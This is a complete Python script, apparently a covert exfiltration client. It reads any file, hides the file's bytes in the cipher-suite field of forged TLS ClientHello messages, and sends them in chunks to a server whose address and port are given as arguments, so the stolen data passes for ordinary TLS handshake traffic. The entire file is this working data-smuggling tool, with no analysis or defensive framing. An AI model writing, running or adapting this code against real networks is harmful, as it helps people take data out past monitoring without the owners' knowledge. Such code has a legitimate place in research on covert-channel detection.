import argparse
import os
import socket


def parse_args():
	p = argparse.ArgumentParser()

	required = p.add_argument_group("required arguments")

	required.add_argument(
		"-f",
		"--file",
		type=argparse.FileType('rb'),
		help="file to send",
		required=True
	)

	required.add_argument(
		"-i",
		"--ip",
		type=str,
		help="server address",
		required=True
	)

	required.add_argument(
		"-p",
		"--port",
		type=int,
		help="server port",
		required=True
	)

	return p.parse_args()


def generate_client_hello(b):
	# TLS 1.2 protocol version
	client_version = bytes.fromhex('0303')

	# 32 bytes of random data
	client_random = os.urandom(32)

	# No session to resume
	session_id = bytes([0])

	# Replace cipher suite data with arbitrary bytes
	cipher_suites = bytearray(0)
	cipher_suites += (len(b)).to_bytes(2, 'big')
	cipher_suites += bytearray(b)

	# Disable compression
	compression = bytes.fromhex('0100')

	# No extensions
	extensions = bytes.fromhex('0000')

	# Combined client hello message
	hello = client_version + client_random + session_id + cipher_suites + compression + extensions

	# TLS handshake header
	handshake_header = bytearray(0)
	# Type is client hello handshake message
	handshake_header.append(0x01)
	# Length of the following client hello message
	handshake_header += len(hello).to_bytes(3, 'big')

	# TLS session record header
	record_header = bytearray(0)
	# Type is handshake record
	record_header.append(0x16)
	# Protocol version is TLS 1.0 for compatibility reasons
	record_header += bytes.fromhex('0301')
	# Length of the following handshake message
	record_header += (len(handshake_header) + len(hello)).to_bytes(2, 'big')

	# Final encapsulated message
	return record_header + handshake_header + hello


if __name__ == "__main__":
	args = parse_args()

	try:
		# Chunk up large files and split them into multiple messages
		chunk_size = 65000

		# Compress and encode each remaining chunk in the file
		for chunk in iter(lambda: args.file.read(chunk_size), b""):

			# Cipher Data is in groupings of 2 bytes each
			if not (len(chunk) % 2 == 0):
				chunk += b'\x00'

			# Generate the client hello message
			hello = generate_client_hello(chunk)

			# Send the message to the server and close the connection
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.connect((args.ip, args.port))
			sock.send(hello)
			sock.close()

		print("[*] File sent")

	# Handle any possible exceptions
	except Exception as e:
		print("[!] {}".format(e))
